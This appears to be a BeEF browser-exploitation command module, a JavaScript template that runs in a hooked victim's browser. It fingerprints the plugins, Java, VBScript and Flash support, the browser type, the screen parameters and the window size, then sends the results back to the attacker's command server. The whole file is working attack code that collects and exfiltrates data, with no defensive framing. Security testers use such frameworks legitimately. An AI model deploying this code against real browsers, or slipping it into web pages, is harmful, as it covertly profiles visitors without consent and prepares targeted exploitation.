beef.execute(function() {
	var plugins = beef.browser.getPlugins();
	var browser_type = JSON.stringify(beef.browser.type());
    var java_enabled = (beef.browser.hasJava())? "Yes" : "No";
    var vbscript_enabled = (beef.browser.hasVBScript())? "Yes" : "No";
    var has_flash = (beef.browser.hasFlash())? "Yes" : "No";
    var screen_params = JSON.stringify(beef.browser.getScreenParams());
    var window_size = JSON.stringify(beef.browser.getWindowSize());
	
    beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'plugins='+plugins+'&java_enabled='+java_enabled+'&vbscript_enabled='+vbscript_enabled+'&has_flash='+has_flash+'&browser_type='+browser_type+'&screen_params='+screen_params+'&window_size='+window_size);
});